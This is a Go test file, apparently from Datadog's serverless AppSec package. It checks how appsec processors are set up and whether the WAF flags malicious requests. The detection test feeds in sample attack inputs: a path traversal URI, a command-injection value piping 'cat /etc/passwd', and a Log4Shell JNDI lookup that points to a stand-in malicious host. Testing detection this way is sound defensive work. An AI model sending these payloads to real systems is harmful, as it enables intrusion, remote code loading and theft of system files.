// Unless explicitly stated otherwise all files in this repository are licensed
// under the Apache License Version 2.0.
// This product includes software developed at Datadog (https://www.datadoghq.com/).
// Copyright 2016-present Datadog, Inc.

package appsec

import (
	"fmt"
	"strconv"
	"testing"

	"github.com/DataDog/go-libddwaf"
	"github.com/stretchr/testify/require"
)

func TestNew(t *testing.T) {
	if err := waf.Health(); err != nil {
		t.Skip("host not supported by appsec", err)
	}

	for _, appsecEnabled := range []bool{true, false} {
		appsecEnabledStr := strconv.FormatBool(appsecEnabled)
		for _, proxyEnabled := range []bool{true, false} {
			proxyEnabledStr := strconv.FormatBool(proxyEnabled)
			t.Run(fmt.Sprintf("new/%s/%s", appsecEnabledStr, proxyEnabledStr), func(t *testing.T) {
				t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", appsecEnabledStr)
				t.Setenv("DD_EXPERIMENTAL_ENABLE_PROXY", proxyEnabledStr)
				lp, pp, err := New()
				switch {
				case !appsecEnabled:
					require.Nil(t, lp)
					require.Nil(t, pp)
				case proxyEnabled:
					require.Nil(t, lp)
					require.NotNil(t, pp)
				case !proxyEnabled:
					require.NotNil(t, lp)
					require.Nil(t, pp)
				default:
					panic("unexpected case")
				}
				require.NoError(t, err)
			})
		}
	}
}

func TestMonitor(t *testing.T) {
	if err := waf.Health(); err != nil {
		t.Skip("host not supported by appsec", err)
	}

	t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", "true")
	asm, err := newAppSec()
	require.NoError(t, err)
	require.Nil(t, err)

	uri := "/path/to/resource/../../../../../database.yml.sqlite3"
	addresses := map[string]interface{}{
		"server.request.uri.raw": uri,
		"server.request.headers.no_cookies": map[string][]string{
			"user-agent": {"sql power injector"},
		},
		"server.request.query": map[string][]string{
			"query": {"$http_server_vars"},
		},
		"server.request.path_params": map[string]string{
			"proxy": "/path/to/resource | cat /etc/passwd |",
		},
		"server.request.body": "eyJ0ZXN0I${jndi:ldap://16.0.2.staging.malicious.server/a}joiYm9keSJ9",
	}
	events := asm.Monitor(addresses)
	require.NotNil(t, events)
}
